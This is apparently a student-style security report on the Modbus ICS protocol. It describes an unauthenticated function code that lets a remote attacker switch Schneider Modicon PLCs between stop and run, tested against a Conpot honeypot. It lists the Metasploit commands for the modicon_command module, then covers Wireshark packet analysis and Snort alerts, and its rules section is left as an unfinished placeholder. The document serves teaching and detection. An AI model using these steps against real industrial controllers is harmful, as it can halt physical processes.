# Overview

In this report, we will focus on modbus, the most widely used SCADA/ICS protocol. We will use Honeypot as the target.<br>

This Report provides:

* Mitigation details for a vulnerability affecting working status of PLC.
* Disclosure of exploit runs on ModBus protocol.
* Simulating an attack scenario against Scada Honeypot (Conpot)
* Modbus attack diagnostic functions in Wireshark
* Writing IDS rules to detect attack

The module used was written by K. Reid Wightman. Let's start with her saying that  "The exploit is otherwise reliable, but depends on a specific version and can't (or doesn't) reliably autodetect."

***

# Vulnerability Overview

#### Improper Input Validation

This module allows a remote user to change the status of the PLC between stop and run.


For this, this module sends a series of initialization requests.<br>


#### Vulnerability Details
The Schneider Modicon with Unity series of PLCs use Modbus function code 90 (0x5a) to perform administrative commands without authentication.

It communicates using ModBus, or Telnet over Ethernet as well as<br>

Having a web server built in that allows a user to issue commands.

##### _Explotability_

This vulnerability could be exploited remotely.

##### _Existence of Exploit_

Known public exploits specifically target this vulnerability.

##### _Difficulty_

An attacker with a medium skill would be able to exploit this vulnerability.



## Impact

Successful exploitation of this vulnerability would allow an attacker to end process control by the PLC, allowing the PLC to switch its state between stop and run. Thus, the attacker can create many problems depending on the PLC's function.<br>

Impact to individual organizations depends on many factors that are unique to each organization.

<br>

***

# Exploitation of Vulnerability
As we mentioned before, with this exploit; attacker can cause a denial of service of the system.

In order to exploit the vulnerability we need to download [Metasploit](https://github.com/rapid7/metasploit-framework)<br>

After downloading metasploit we can run it by typing;

```
# msfconsole
```

We can see the ModBus Frameworks' modules by typing;

```
# show all
```

```
# use /auxiliary/admin/scada/modicon_command
```

```
# show options
```

We have checked what parameters our exploit needs to run. This exploit needs;<br>

`RHOST` = remote host ip address,<br>


paramateres.

```
# set RHOSTS <ip>
```

After giving the parameters which are wanted we are ready to run it.

```
# exploit
```

As you can see above, dos attack has started.

***

# Packet Analysing
Run wireshark while exploit we’ve use running behind.
You see the blue part. This packet is the packet to the modbus protocol we want to analyze.

<p align="center">
  <img src="https://github.com/ics-scada/Reports/blob/main/Modbus/Screenshots/wireshark1.png">
</p>

Double-clicking on the line will open the package content. 
<br>
If we click Ethernet II line the linked parts will be highlighted. And so we can see the address information and the name of the protocol used.

<p align="center">
  <img src="https://github.com/ics-scada/Reports/blob/main/Modbus/Screenshots/wireshark2.png">
</p>

<br>
IP Header holds network layer information. Of these, it keeps the information of the IPv4 protocol, which is accepted as the backbone of the OSI model, in all its details.

<br/>
<p align="center">
  <img src="https://github.com/ics-scada/Reports/blob/main/Modbus/Screenshots/wireshrak3.png">
</p>

<br>
TCP, UDP, ICMP are important protocols of the transport layer of the OSI model given in the host-to-host connection. They play an important role in the error-free transmission of data. When it examines network layer information in Wireshark, you can see that TCP is used to communicate with the target device.
 
***

# Rules
As a result of using this module, an alarm as below was generated by the snort on the target machine.
<br>

<p align="center">
  <img src="https://github.com/ics-scada/Reports/blob/main/Modbus/Screenshots/alarm_command.png">
</p>

<br>
Accordingly, we can say that there is a rule used for the modicon_command module on snort. The rules used are as follows.

```
# burada görüntü kural olmalı 
```



